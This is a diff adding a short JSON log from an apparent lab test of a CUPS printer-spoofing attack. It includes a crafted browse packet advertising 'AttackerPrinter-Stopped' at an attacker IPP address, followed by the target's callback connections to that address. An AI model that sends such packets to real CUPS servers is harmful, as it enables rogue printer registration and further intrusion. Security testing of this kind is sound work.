@@ -1,0 +1,22 @@
+[
+  {
+    "timestamp": "2026-11-09T13:51:50.436022",
+    "variation": 3,
+    "description": "Printer state=stopped (abnormal)",
+    "src_ip": "172.18.0.1",
+    "src_port": 12380,
+    "dst_ip": "172.18.0.2",
+    "dst_port": 631,
+    "payload": "0 5 ipp://172.18.0.1:8631/printers/NAME \"Kali Lab\" \"AttackerPrinter-Stopped\""
+  },
+  {
+    "timestamp": "2026-11-09T13:52:06.434162",
+    "event": "cups_tcp_callback",
+    "summary": "Ether / IP / TCP 172.18.0.2:34282 > 172.18.0.1:8631 S"
+  },
+  {
+    "timestamp": "2026-11-09T13:52:06.434308",
+    "event": "cups_tcp_callback",
+    "summary": "Ether / IP / TCP 172.18.0.2:34290 > 172.18.0.1:8631 S"
+  }
+]
